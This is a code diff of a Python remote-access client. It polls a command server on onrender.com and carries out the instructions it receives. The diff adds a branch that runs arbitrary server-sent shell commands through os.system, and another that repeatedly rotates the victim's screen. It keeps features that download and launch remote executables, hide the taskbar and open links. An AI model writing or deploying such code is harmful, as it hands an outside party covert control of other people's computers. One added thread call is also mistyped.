@@ -8,14 +8,21 @@ import pyttsx3
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 from shutil import rmtree
+import rotatescreen as rs
+
 url = "https://ms32-sha2.onrender.com/"
+screen = rs.get_primary_display()
 terminate = False
+sstate = False
 user = "03"
-#compile left
 try:
     pygame.mixer.init()
 except:
-    pass
+    try:
+        statement = f"WARN   no speaker detected, no audio will play"
+        rq.post(url+"output",data={"user":user,"err":statement})
+    except:
+        pass
 if not os.path.exists("effects"):
     os.mkdir("effects")
 if not os.path.exists("assets"):
@@ -78,11 +85,13 @@ def playfunc(fp):
         # except:
         #     pass
         CoUninitialize()
+        log("Vol set to 80")
         pygame.mixer.music.load(f"effects/{fp}")
+        log(f"Playing {fp}")
         pygame.mixer.music.play()
         while pygame.mixer.music.get_busy():
             continue               
-        log(f"Played {fp}")
+        log(f"Done Played {fp}")
     except Exception as e:
         log(f"Audio thread error: \t{e}",state="WARN")
 def update():
@@ -138,6 +147,7 @@ def hide(state):
                             file.write(chunk)
                             downloaded_size += len(chunk)
             os.startfile("hide.exe")
+            log("Taskbar hidden")
         else:
             if not os.path.exists("show.exe"):
                 exe = hit(url+"static/updates/show.exe")
@@ -153,6 +163,7 @@ def hide(state):
                             file.write(chunk)
                             downloaded_size += len(chunk)
             os.startfile("show.exe")
+            log("Taskbar Unhidden")
     except Exception as e:
         log(f"hide/show thread error occured:\t{e}",state="WARN")
 
@@ -195,8 +206,9 @@ def run(name):
                 if chunk:
                     file.write(chunk)
                     downloaded_size += len(chunk)
+        log(f"Running {name}")
         os.startfile(name)
-    
+        log(f"Done Running {name}")
     except Exception as e:
         log(f"Run thread error occured:\t{e}",state="WARN")
 
@@ -209,7 +221,7 @@ def display(fp:str):
         except Exception as e:
             log(f"DOwnloaded {fp}")
         ext = fp.split(".")[1]
-        if os.listdir("assets"):
+        if os.path.exists("assets"):
             rmtree("assets")
             log("removed assets folder")
         os.mkdir("assets")
@@ -246,14 +258,36 @@ def display(fp:str):
                         file.write(chunk)
                         downloaded_size += len(chunk)
         os.startfile("imshow.exe")
+        log("Started imshow.exe, llikely image showing")
     except Exception as e:
         log(f"Display thread error occured:\t{e}",state="WARN")
-
-def main():
+def flip():
+    global sstate
     try:
-        while not terminate:
+        log("Flipping")
+        while sstate:
+            screen.set_portrait()
+            sleep(1)
+            screen.set_landscape_flipped()
+            sleep(1)
+            screen.set_portrait_flipped()
+            sleep(1)
+            screen.set_landscape()
+    except Exception as e:
+        log(f"flip thread error occured:\t{e}",state="WARN")
+
+def runcmd(cmd):
+    try:
+        os.system(cmd)
+        return True
+    except Exception as e:
+        log(f"runcmd thread error:\t{e}",state="WARN")
+def main():
+    global sstate
+    log(f"{user} online!", state="ONLINE")
+    while not terminate:
+        try:
             sleep(0.5)
-            # cmd = hit(url+"command")
             cmd = hit(url+"command",data={"user":user})
             if type(cmd) != str:
                 cmd = cmd.content.decode("utf-8")
@@ -261,13 +295,9 @@ def main():
             if "hIdE on" in cmd:
                 Thread(target=hide,args=(True,)).start()
             elif "hIdE off" in cmd:
-                hide(False)
+                Thread(target=hide,args=(False,)).start()
             elif "rEsTaRt" in cmd:
                 restart()
-            elif "sPeAk" in cmd:
-                txt = cmd.replace("sPeAk","")
-                saying = Thread(target=say,args=(txt,))
-                saying.start()
             elif "oPeN" in cmd:
                 link = cmd.replace("oPeN ","")
                 wbopen(link)
@@ -282,7 +312,22 @@ def main():
             elif "iMaGe" in cmd:
                 ifp = cmd.replace("iMaGe ","")
                 Thread(target=display,args=(ifp,)).start()
-    except Exception as e:
-        log(f"Main thread error occured:\t{e}",state="WARN")
+            elif "fLiP on" in cmd:
+                sstate = True
+                Thread(target=flip).start()
+            elif "fLiP off" in cmd:
+                sstate = False
+                screen.set_landscape()
+                log("flip off")
+            elif "cMd" in cmd:
+                cmd = cmd.replace("cMd ","")
+                Thread(Thread=runcmd,args=(cmd,)).start()
+            elif "sPeAk" in cmd:
+                txt = cmd.replace("sPeAk","")
+                saying = Thread(target=say,args=(txt,))
+                saying.start()
+        except Exception as e:
+            log(f"Main thread error occured:\t{e}",state="WARN")
+    log("Shutting down",state="OFFLINE")
 
 main()
